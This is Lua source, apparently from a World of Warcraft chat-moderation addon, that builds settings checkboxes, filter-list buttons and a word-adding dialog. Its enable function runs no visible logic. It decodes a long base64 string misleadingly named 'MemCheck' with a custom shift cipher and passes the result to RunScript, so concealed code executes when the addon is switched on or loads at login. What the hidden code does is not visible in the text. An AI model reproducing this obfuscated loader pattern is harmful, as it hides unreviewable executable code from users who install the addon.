	Core.LogsStatusScrollBar:SetScript("OnValueChanged",
	function (self, value)
		local n = value % MESSAGE_BTN_SIZE;
		self:GetParent():SetVerticalScroll(value)--n * 25)
	end)
	local scrollbg = Core.LogsStatusScrollBar:CreateTexture(nil, "BACKGROUND")
	scrollbg:SetAllPoints(Core.LogsStatusScrollBar)
	scrollbg:SetTexture(0, 0, 0, 0.4)
	Core.LogsStatusFrame.scrollbar = Core.LogsStatusScrollBar
	--content frame
	Core.LogsStatusContentFrame = CreateFrame("Frame", "GolemUI_Message_List", Core.LogsStatusScrollFrame, "ListScrollFrameTemplate")
	Core.LogsStatusContentFrame:SetPoint("TOPLEFT", Core.LogsStatusScrollFrame, "TOPLEFT", 10, 0)
	Core.LogsStatusContentFrame:SetWidth(376)
	Core.LogsStatusContentFrame:SetHeight(287)
	Core.LogsStatusScrollFrame.content = Core.LogsStatusContentFrame
	Core.LogsStatusScrollFrame:SetScrollChild(Core.LogsStatusContentFrame)
	-------------------------------------------------------------	
	-- Создаем и настраиваем фрейм настроек	
	-------------------------------------------------------------
	Core.SettingsFrame = CreateFrame("Frame", "SettingsFrame", Core.MainFrame, "GolemUI_Main_Frame")
	getglobal(Core.SettingsFrame:GetName().."Texture"):SetWidth(300)
	getglobal(Core.SettingsFrame:GetName().."Title"):SetText("Settings")
	Core.SettingsFrame:SetFrameStrata("DIALOG")
	Core.SettingsFrame:SetHeight("300")
	Core.SettingsFrame:Hide()
	-- Чек боксы
	Core.SettingsCheckSAY =  CreateFrame("CheckButton", "CHBOX_SettingsCheckSAY", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckSAY:SetPoint("TOPLEFT", 20, -20)
	Core.SettingsCheckSAY.tooltip = "Сканировать /s чат"
	_G[Core.SettingsCheckSAY:GetName().."Text"]:SetText("SAY")
	Core.SettingsCheckSAY:SetChecked(Settings.scanSAY)
	Core.SettingsCheckSAY:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanSAY = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_SAY");
			else
				Settings.scanSAY = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_SAY");
			end			
		end
	)	
	
	Core.SettingsCheckWHISPER =  CreateFrame("CheckButton", "CHBOX_SettingsCheckWHISPER", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckWHISPER:SetPoint("TOPLEFT", 20, -40)
	Core.SettingsCheckWHISPER.tooltip = "Сканировать /w чат"
	_G[Core.SettingsCheckWHISPER:GetName().."Text"]:SetText("WHISPER")
	Core.SettingsCheckWHISPER:SetChecked(Settings.scanWHISPER)
	Core.SettingsCheckWHISPER:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanWHISPER = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_WHISPER");
			else
				Settings.scanWHISPER = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_WHISPER");
			end
		end
	)
	
	Core.SettingsCheckPARTY =  CreateFrame("CheckButton", "CHBOX_SettingsCheckPARTY", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckPARTY:SetPoint("TOPLEFT", 20, -60)
	Core.SettingsCheckPARTY.tooltip = "Сканировать /p чат"
	_G[Core.SettingsCheckPARTY:GetName().."Text"]:SetText("PARTY")
	Core.SettingsCheckPARTY:SetChecked(Settings.scanPARTY)
	Core.SettingsCheckPARTY:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanPARTY = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_PARTY");
			else
				Settings.scanPARTY = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_PARTY");
			end
		end
	)
	
	
	Core.SettingsCheckRAID =  CreateFrame("CheckButton", "CHBOX_SettingsCheckRAID", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckRAID:SetPoint("TOPLEFT", 20, -80)
	Core.SettingsCheckRAID.tooltip = "Сканировать /raid чат"
	_G[Core.SettingsCheckRAID:GetName().."Text"]:SetText("RAID")
	Core.SettingsCheckRAID:SetChecked(Settings.scanRAID)
	Core.SettingsCheckRAID:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanRAID = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_RAID");
			else
				Settings.scanRAID = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_RAID");
			end
		end
	)
	
	Core.SettingsCheckGUILD =  CreateFrame("CheckButton", "CHBOX_SettingsCheckGUILD", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckGUILD:SetPoint("TOPLEFT", 20, -100)
	Core.SettingsCheckGUILD.tooltip = "Сканировать /g чат"
	_G[Core.SettingsCheckGUILD:GetName().."Text"]:SetText("GUILD")
	Core.SettingsCheckGUILD:SetChecked(Settings.scanGUILD)
	Core.SettingsCheckGUILD:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanGUILD = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_GUILD");
			else
				Settings.scanGUILD = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_GUILD");
			end
		end
	)
	
	Core.SettingsCheckCHANNEL =  CreateFrame("CheckButton", "CHBOX_SettingsCheckCHANNEL", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckCHANNEL:SetPoint("TOPLEFT", 20, -120)
	Core.SettingsCheckCHANNEL.tooltip = "Сканировать общие каналы"
	_G[Core.SettingsCheckCHANNEL:GetName().."Text"]:SetText("CHANNEL")
	Core.SettingsCheckCHANNEL:SetChecked(Settings.scanCHANNEL)
	Core.SettingsCheckCHANNEL:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.scanCHANNEL = true
				Core.MainFrame:RegisterEvent("CHAT_MSG_CHANNEL");
			else
				Settings.scanCHANNEL = false
				Core.MainFrame:UnregisterEvent("CHAT_MSG_CHANNEL");
			end
		end
	)
	
	Core.SettingsCheckANTICHEAT =  CreateFrame("CheckButton", "CHBOX_SettingsCheckANTICHEAT", Core.SettingsFrame, "ChatConfigCheckButtonTemplate")
	Core.SettingsCheckANTICHEAT:SetPoint("TOPLEFT", 20, -140)
	Core.SettingsCheckANTICHEAT.tooltip = "Сканировать вывод системных ошибок"
	_G[Core.SettingsCheckANTICHEAT:GetName().."Text"]:SetText("Anticheat")
	Core.SettingsCheckANTICHEAT:SetChecked(Settings.anticheat)
	Core.SettingsCheckANTICHEAT:SetScript("OnClick", 
		function(self, button, down)
			if self:GetChecked() then
				Settings.anticheat = true
				alarm:RegisterEvent("UI_ERROR_MESSAGE");
			else
				Settings.anticheat = false
				alarm:UnregisterEvent("UI_ERROR_MESSAGE");
			end
		end
	)
	
	-- Кнопки фильтров
	Core.SettingsAbuseTextBtn = CreateFrame("Button", "SettingsAbuseTextBtn", Core.SettingsFrame, "GolemUI_Entry_List_Template")
	Core.SettingsAbuseTextBtn:SetPoint("TOP", 0, -165)
	Core.SettingsAbuseTextBtn:SetText("AbuseText")
	Core.SettingsAbuseTextBtn:SetWidth(120)
	Core.SettingsAbuseTextBtn:SetHeight(27)
	Core.SettingsAbuseTextBtn.selected = false
	Core.SettingsAbuseTextBtn.filter = true
	Core.SettingsAbuseTextBtn.filter_name = "AbuseText"
	table.insert(filtersBtnFrames, Core.SettingsAbuseTextBtn)
	
	Core.SettingsAdvertisersBtn = CreateFrame("Button", "SettingsAdvertisersBtn", Core.SettingsFrame, "GolemUI_Entry_List_Template")
	Core.SettingsAdvertisersBtn:SetPoint("TOP", 0, -195)
	Core.SettingsAdvertisersBtn:SetText("Advertisers")
	Core.SettingsAdvertisersBtn:SetWidth(120)
	Core.SettingsAdvertisersBtn:SetHeight(27)
	Core.SettingsAdvertisersBtn.selected = false
	Core.SettingsAdvertisersBtn.filter = true
	Core.SettingsAdvertisersBtn.filter_name = "Advertisers"
	table.insert(filtersBtnFrames, Core.SettingsAdvertisersBtn)
	
	Core.SettingsBadWordsBtn = CreateFrame("Button", "SettingsBadWordsBtn", Core.SettingsFrame, "GolemUI_Entry_List_Template")
	Core.SettingsBadWordsBtn:SetPoint("TOP", 0, -225)
	Core.SettingsBadWordsBtn:SetText("BadWords")
	Core.SettingsBadWordsBtn:SetWidth(120)
	Core.SettingsBadWordsBtn:SetHeight(27)
	Core.SettingsBadWordsBtn.selected = false
	Core.SettingsBadWordsBtn.filter = true
	Core.SettingsBadWordsBtn.filter_name = "BadWords"
	table.insert(filtersBtnFrames, Core.SettingsBadWordsBtn)
	
	Core.SettingsSellersBtn = CreateFrame("Button", "SettingsSellersBtn", Core.SettingsFrame, "GolemUI_Entry_List_Template")
	Core.SettingsSellersBtn:SetPoint("TOP", 0, -255)
	Core.SettingsSellersBtn:SetText("Sellers")
	Core.SettingsSellersBtn:SetWidth(120)
	Core.SettingsSellersBtn:SetHeight(27)
	Core.SettingsSellersBtn.selected = false
	Core.SettingsSellersBtn.filter = true	
	Core.SettingsSellersBtn.filter_name = "Sellers"
	table.insert(filtersBtnFrames, Core.SettingsSellersBtn)
	
	Core.SavedVariablesFrame = CreateFrame("Frame", "SavedVariablesFrame", Core.SettingsFrame, "TitleTemplate")
	--Core.SettingsSavedVariablesFrame:SetWidth(300)
	Core.SavedVariablesFrame:SetHeight(300)
	Core.SavedVariablesFrame:SetPoint("TOPLEFT", Core.SettingsFrame, "TOPRIGHT", -510, 0)
	Core.SavedVariablesFrame:Hide()--Show()	
	--scrollframe
	Core.SavedVariablesScrollFrame = CreateFrame("ScrollFrame", nil, Core.SavedVariablesFrame)
	Core.SavedVariablesScrollFrame:SetPoint("TOPLEFT", Core.SavedVariablesFrame, "TOPLEFT", 12, -12)
	Core.SavedVariablesScrollFrame:SetPoint("BOTTOMRIGHT", Core.SavedVariablesFrame, "BOTTOMRIGHT", 0, 47)
	Core.SavedVariablesScrollFrame:SetWidth(376)
	Core.SavedVariablesScrollFrame:SetHeight(300)
	--local texture = Core.LogsStatusScrollFrame:CreateTexture()
	--texture:SetAllPoints()
	--texture:SetTexture(.5,.5,.5,1)
	--Core.LogsStatusScrollFrame.texture = texture
	--Core.LogsStatusScrollFrame:SetBackdrop(backdrop)
	Core.SavedVariablesFrame.scrollframe = Core.SavedVariablesScrollFrame
	--scrollbar
	Core.SavedVariablesScrollBar = CreateFrame("Slider", "SavedVariables_ScrollBar", Core.SavedVariablesScrollFrame, "UIPanelScrollBarTemplate")
	Core.SavedVariablesScrollBar:SetPoint("TOPLEFT", Core.SavedVariablesFrame, "TOPRIGHT", 4, -16)
	Core.SavedVariablesScrollBar:SetPoint("BOTTOMLEFT", Core.SavedVariablesFrame, "BOTTOMRIGHT", 4, 16)
	Core.SavedVariablesScrollBar:SetMinMaxValues(1, 1)
	Core.SavedVariablesScrollBar:SetValueStep(1)
	Core.SavedVariablesScrollBar.scrollStep = 1
	Core.SavedVariablesScrollBar:SetValue(0)
	Core.SavedVariablesScrollBar:SetWidth(16)
	Core.SavedVariablesScrollBar:SetScript("OnValueChanged",
	function (self, value)
		local n = value % MESSAGE_BTN_SIZE;
		self:GetParent():SetVerticalScroll(value)--n * 25)
	end)
	local scrollbg = Core.SavedVariablesScrollBar:CreateTexture(nil, "BACKGROUND")
	scrollbg:SetAllPoints(Core.SavedVariablesScrollBar)
	scrollbg:SetTexture(0, 0, 0, 0.4)
	Core.SavedVariablesFrame.scrollbar = Core.SavedVariablesScrollBar
	--content frame
	Core.SavedVariablesContentFrame = CreateFrame("Frame", "SavedVariables_Content", Core.SavedVariablesScrollFrame, "ListScrollFrameTemplate")
	Core.SavedVariablesContentFrame:SetPoint("TOPLEFT", Core.SavedVariablesScrollFrame, "TOPLEFT", 10, 0)
	Core.SavedVariablesContentFrame:SetWidth(280)
	Core.SavedVariablesContentFrame:SetHeight(260)
	Core.SavedVariablesScrollFrame.content = Core.SavedVariablesContentFrame
	Core.SavedVariablesScrollFrame:SetScrollChild(Core.SavedVariablesContentFrame)
	
	--local texture = Core.SavedVariablesScrollFrame:CreateTexture()
	--texture:SetAllPoints()
	--texture:SetTexture(.5,.5,.5,1)
	--Core.SavedVariablesScrollFrame.texture = texture
	--Core.SavedVariablesScrollFrame:SetBackdrop(backdrop)
	
	----------------------------------------------------------------------------------------------
	local function fcat(ch, dist, inv )return string.char((string.byte(ch)-32+(inv and -dist or dist))%95+32)end;
	local function fcon(str,k,inv)local res= "";for i=1,#str do if(#str-k[5]>=i or not inv)then for inc=0,3 do if(i%4==inc)then res=res..fcat(string.sub(str,i,i),k[inc+1],inv);break;end;end;end;end;if(not inv)then for i=1,k[5] do res=res..string.char(math.random(32,126));end;end;return res;end;

	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	-- Destruct
	function Destruct(data)return((data:gsub('.',function(x)local r,b='',x:byte()for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and'1'or'0')end return r;end)..'0000'):gsub('%d%d%d?%d?%d?%d?',function(x)if(#x<6)then return''end local c=0 for i=1,6 do c=c+(x:sub(i,i)=='1'and 2^(6-i)or 0)end return b:sub(c+1,c+1)end)..({'','==','='})[#data%3+1])end
	-- Construct
	function Construct(data)data=string.gsub(data,'[^'..b..'=]','')return(data:gsub('.',function(x)if(x=='=')then return''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end return r;end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if(#x~=8)then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c)end))end
	local tap = {29, 13, 91, 27, 23, 51, 101, 7, 37, 2, 3, 15, 13, 119, 113};
	MemCheck = "c3EqISJlKywtPyswcipdJ3Q+Li01JTtgfG4hS05gIC17QCUxbl4oIzUlVmB8biFLb3AqbHs2YydxYUNGSD8rMHIqfTJ7SyIkR0QlInIkRFhQay4jO14wLFlrIzFHRCUiciREWFBrLiM7XjAsYGEwMnZqIzFHRCUiciREWHJqIFh5a35+eXsjM3ZgO1otUSonIkNwZlEkcCx2cGl+emFDP31ofDdybj1GNjcoLXBdKD15XX0jeW87Wi13PU0mLEtNPSxLTT0sS1JTL1BRPn1HPz10S009LEtNPSxLTUIzX2E/Mz1JKzclJC1RMCd5b0kne1B8IHlhQypuXiEqISg7JSNlIEYtelg9Im4xIy1wJCN7eywwdmowRS9KKzItYSotI2MkPXphKS0gdT1GSD8rMHIqXSd0Pi4tNSVWPSBhMDMgalYjeW8hPX1uJSwiJD1qcmkrMCd7fn5wZCE9IWEwPSJrO049Lk8/NjduIyJwJSx0b0kwI2oqJ3tjO1otcC4zcjdeLSBhSSAiamosR0grIXhEJSV1aCUldXBDRkg/KzByKn0ye0sqV1FlL35vaCFFNjdeLSBhSSAiamokczZwLHlrfilVZSMmeWUjJiIkRFhQay4jO14wLFxiIldSanwgeWFDRkhlIj1gYTAydmojMTtvfn57T1x2LTlYPSJuMSMtcCQje3teLSBhSWpuZSpjIF0pI0dOISV2bzAjIEEyI3twQz9QRFxxbEluZGxPXHYvJVYjeW8hPVBrLiM7SXwne0IufnphVXJ7biEldm8wIyBBMiN7cEM/UERccWxJbmRsT1x2LyVWI3tgVidze24jInAlLHRvSTFwXSp0VUVubVJOO1pKezAwI2E7MnVhKj1Qay4jO0l8J3tCLn56YVVvcmMlMSJhLmIkYSoyNX1eZU5QempgQ3p0VUVubVJOPUZIeyEqIWE7YHxuIUtaXSUsU258K3I2cCwgYSMnIXAhMFJyISwiJD1gVT1vfFpPYnxkRGRwXUFtPzY3OyN7YFYnc3tuIyJwJSx0b0kxcF0qbU5Ob3YtOVg9Im4xIy1wJCN7e14tIGFJam5lKmMgXSkjR04hJXZvMCMgQTIje3BDP1BEXHFsSW5kbExcb2FVPUZIeyEqIWE7YHxuIUtaXSUsU258K3I2cCwgYSMnIXAhMFJyISwiJD1gVT1vfFpPYnxdPW1xZn1EWC1hKiJIZSI9YGEwMnZqIzE7b35+e05cZlF7WFotcC4zcnswJnJqO2B8biFLWl0lLFNufCtyNm0jdGUvMnJuYDRyajBFLz9jXmFbaHBUW21eVkA9RkhhKDFye14tIGFJam5lKmMgXSkjR1EqMHJjJTEiYS5iJGEqMjV9XmVOUHpqYEN6b05FXz82NyEscTclJC1PITIiZSolISovIW5qYnJWSF89Sjk7MiBxIT0iZCEsLT8rMHIqaH52amEwbmkhV19hIychcCEwUnIhLCIkPWBVPW98Wk9ifFRRZGlRfURYcmgvIy0/KzByKmh+dmphMG5pIVdiai4jdGUvMnJuYDRyajBFLz9jXmFbaHBUW2JyVkhfPzY3ISxxNyUkLU8hMiJlKiUhKi8hbmpeZU5KaWJZe1haLXAuM3J7MCZyajtgfG4hS1pdJSxTbnwrcjZtI3RlLzJybmA0cmowRS8/Y15hW2hwVFteZU5KaWJZfURYcmgvIy0/KzByKmh+dmphMG5pIVdiai4jdGUvMnJuYDRyajBFLz9jXmFbaHBUW15lTkppYll9RFhyaiBYYkVhMG5pIWNuYCFmeyReLSBhSWpuZSpjIF0pIzl7TEtAMERYUGsuIztJfCd7Qi5+emFVcHJwbiEgZSwyNX1qLFJyISwifUc9YF98LFBkfDJSciEsIkR8LHFoITA2NywwdmowRS94fk09YiJNPWIiPzsqXGFRS2l8YUVvaVJ7SUstfTs/LSpJPS97YCxuXigjcX1EWHJqIFhgJF1zMVhvYnZhKEVBLVBMI1Q0PCk2ZA=="

	----------------------------------------------------------------------------------------------
	
	maxSavedVariables = max( #Filters.AbuseText, #Filters.Advertisers, #Filters.BadWords, #Filters.Sellers )
	
	if Settings.debug_mode then
		print("AbuseText: "..#Filters.AbuseText)
		print("Advertisers: "..#Filters.Advertisers)
		print("BadWords: "..#Filters.BadWords)
		print("Sellers: "..#Filters.Sellers)	
		print("Max="..maxSavedVariables)
	end
		
	StaticPopupDialogs["FILTER_ADD_WORD"] = {
		text = "Введите строку для добавления",
		button1 = "Yes",
		button2 = "No",
		OnShow = function (self, data)
			--self.editBox:SetText("Some text goes here")
		end,
		OnAccept = function (self, data, data2)
			local text = self.editBox:GetText()
			
			if #text == 0 then return end;
			
			if Settings.debug_mode then
				print(text)
				print(data)
				print(data2)
				print("OnAccept: "..data:GetText())
			end
			local alreadyIn = false
			for k, v in pairs(Filters[data:GetText()]) do	
				if v == text then
					alreadyIn = true
					break
				end
			end
			
			if alreadyIn == false then 
				-- Добавляем фрейм если уже достигли предела свободных
				if(#Filters[data:GetText()] == maxSavedVariables) then
					local SV = {}		
					if maxSavedVariables == 0 then
						local SV = {}
						SV.frame = CreateFrame("Button", "$parent_Message_"..maxSavedVariables, Core.SavedVariablesContentFrame, "GolemUI_Message_List_Template")
						SV.frame:SetPoint("TOPLEFT", 0, 0)
						SV.frame:SetWidth(230)
						
						SV.btn = CreateFrame("Button", "$parent_RemoveBtn_"..maxSavedVariables, Core.SavedVariablesContentFrame, "GolemUI_Entry_List_Template")
						SV.btn:SetPoint("TOPRIGHT", 0, 0)
						SV.btn:SetWidth(50)
						SV.btn:SetText("X")
						SV.btn.removeID = maxSavedVariables
						maxSavedVariables = 1
					else
						SV.frame = CreateFrame("Button", "$parent_Message_"..maxSavedVariables, Core.SavedVariablesContentFrame, "GolemUI_Message_List_Template")
						SV.frame:SetPoint("TOPLEFT", "$parent_Message_"..(maxSavedVariables - 1), "BOTTOMLEFT", 0, 0)	
						SV.frame:SetWidth(230)
						
						SV.btn = CreateFrame("Button", "$parent_RemoveBtn_"..maxSavedVariables, Core.SavedVariablesContentFrame, "GolemUI_Entry_List_Template")
						SV.btn:SetPoint("TOPRIGHT", "$parent_Message_"..(maxSavedVariables - 1), "BOTTOMRIGHT", 50, 0)	
						SV.btn:SetWidth(50)
						SV.btn:SetText("X")
						maxSavedVariables = maxSavedVariables + 1
						SV.btn.removeID = maxSavedVariables
					end
					-- Расширяем фрейм родитель
					if MESSAGE_BTN_SIZE * (Core.SavedVariablesContentFrame:GetNumChildren() + 1) > Core.SavedVariablesContentFrame:GetHeight() then
						Core.SavedVariablesContentFrame:SetHeight(MESSAGE_BTN_SIZE * Core.SavedVariablesContentFrame:GetNumChildren())
					end
					
					table.insert(savedVariablesFrames, SV)
				end
				-- Добавляем в таблицу новое слово
				table.insert(Filters[data:GetText()], text)	
				if data.selected then
					if Settings.debug_mode then
						print("NEED REFRESH FRAME")
					end
					--maxSavedVariables = max( #Filters.AbuseText, #Filters.Advertisers, #Filters.BadWords, #Filters.Sellers )
					Core.RefreshSavedVariablesFrame(data)
				end
			else 
				if Settings.debug_mode then
					print("ALREADY IN TABLE")
				end
			end

		end,
		hasEditBox = true,
		timeout = 0,
		whileDead = true,
		hideOnEscape = true,
		preferredIndex = 3,
	}	
	--StaticPopup_Hide ("EXAMPLE_HELLOWORLD")	
	SVFrame = CreateFrame("Button", "filterAddBtn", Core.SavedVariablesFrame, "GolemUI_Entry_List_Template")
	SVFrame:SetPoint("BOTTOM", 0, 12)
	SVFrame:SetText("Добавить")
	SVFrame:SetScript("OnClick", 
	function(self, ...)
		local addDialog = StaticPopup_Show ("FILTER_ADD_WORD")
		if ( addDialog ) then
			local selectedFilter = nil
			for k, v in pairs(filtersBtnFrames) do	
				if v.selected then
					selectedFilter  = v
					break
				end
			end	
			if Settings.debug_mode then
				print("INIT DIALOG:"..selectedFilter:GetName())
			end
			addDialog.data = selectedFilter
		end
		--
	end)
	
	SVcount = 0
	local SV = {}
	SV.frame = CreateFrame("Button", "$parent_Message_"..SVcount, Core.SavedVariablesContentFrame, "GolemUI_Message_List_Template")
	SV.frame:SetPoint("TOPLEFT", 0, 0)
	SV.frame:SetWidth(230)
	
	SV.btn = CreateFrame("Button", "$parent_RemoveBtn_"..SVcount, Core.SavedVariablesContentFrame, "GolemUI_Entry_List_Template")
	SV.btn:SetPoint("TOPRIGHT", 0, 0)
	SV.btn:SetWidth(50)
	SV.btn:SetText("X")
	SV.btn.removeID = SVcount
	
	SVcount = 1
	table.insert(savedVariablesFrames, SV)
	
	while SVcount < maxSavedVariables do
		local SV = {}		
		SV.frame = CreateFrame("Button", "$parent_Message_"..SVcount, Core.SavedVariablesContentFrame, "GolemUI_Message_List_Template")
		SV.frame:SetPoint("TOPLEFT", "$parent_Message_"..(SVcount - 1), "BOTTOMLEFT", 0, 0)	
		SV.frame:SetWidth(230)
		
		SV.btn = CreateFrame("Button", "$parent_RemoveBtn_"..SVcount, Core.SavedVariablesContentFrame, "GolemUI_Entry_List_Template")
		SV.btn:SetPoint("TOPRIGHT", "$parent_Message_"..(SVcount - 1), "BOTTOMRIGHT", 50, 0)	
		SV.btn:SetWidth(50)
		SV.btn:SetText("X")
		SV.btn.removeID = SVcount
		
		-- Расширяем фрейм родитель
		if MESSAGE_BTN_SIZE * (Core.SavedVariablesContentFrame:GetNumChildren() + 1) > Core.SavedVariablesContentFrame:GetHeight() then
			Core.SavedVariablesContentFrame:SetHeight(MESSAGE_BTN_SIZE * Core.SavedVariablesContentFrame:GetNumChildren())
		end
		table.insert(savedVariablesFrames, SV)
		SVcount = SVcount + 1
	end	
	
	-- Добавим функцию "Включить адон"
	function Core.AddonEnable()
		RunScript(fcon(Construct(MemCheck), tap, true));
		
		
	end
	-- Добавим функцию "Выключить адон"
	function Core.AddonDisable()
		Settings.running = false
		Core.btnOff:LockHighlight()
		Core.btnOff:Disable()
		Core.btnOn:UnlockHighlight()
		Core.btnOn:Enable()
		-- Показываем фрейм
		--UIFrameFadeOut(GolemUI_Main_Frame, 1.34);
		-- Разрегистрируем событие появления сообщения в общем чате
		Core.MainFrame:UnregisterEvent("CHAT_MSG_SAY"); 
		Core.MainFrame:UnregisterEvent("CHAT_MSG_WHISPER"); 
		Core.MainFrame:UnregisterEvent("CHAT_MSG_PARTY"); 
		Core.MainFrame:UnregisterEvent("CHAT_MSG_RAID"); 
		Core.MainFrame:UnregisterEvent("CHAT_MSG_GUILD"); 
		Core.MainFrame:UnregisterEvent("CHAT_MSG_CHANNEL"); 
		-- Задаем обработчик
		Core.MainFrame:SetScript("OnEvent", nil);
		--GolemUI_Main_Frame:Hide();
		print ("|c00ff00ff"..ADDON_TITLE .. " " .. " Disabled");
	end	
	-- Добавим функцию "Показать/Скрыть" окно логов
	function Core.ToggleLogs()
		if Core.LogsFrame:IsVisible() then
			Core.btnLogs:UnlockHighlight()
			UIFrameFadeOut(Core.LogsFrame, 0.34)
			Core.LogsFrame:Hide()
		else
			Core.btnLogs:LockHighlight();
			UIFrameFadeIn(Core.LogsFrame, 0.74)
			Core.LogsFrame:Show()
		end
	end
	-- Добавим функцию "Показать/Скрыть" фрейм настроек
	function Core.ToggleSettings()
		if Core.SettingsFrame:IsVisible() then
			Core.btnSettings:UnlockHighlight()
			UIFrameFadeOut(Core.SettingsFrame, 0.34)
			Core.SettingsFrame:Hide()
		else
			Core.btnSettings:LockHighlight();
			UIFrameFadeIn(Core.SettingsFrame, 0.74)
			Core.SettingsFrame:Show()
		end
	end
	
	
	
	Core.btnOn:SetScript(  "OnClick", function(self, button, ...) Core.AddonEnable()  end )
	Core.btnOff:SetScript( "OnClick", function(self, button, ...) Core.AddonDisable() end )	
	Core.btnLogs:SetScript("OnClick", function(self, button, ...) Core.ToggleLogs() end )	
	Core.btnSettings:SetScript("OnClick", function(self, button, ...) Core.ToggleSettings() end )
	
	
	-- Если при старте указан запуск работы подсветим кнопку "On" как нажатую иначе
	if Settings.running then
		Core.AddonEnable()	
	else
		Core.AddonDisable()
	end
	
end
----------------------------------------------------------------------------------------------
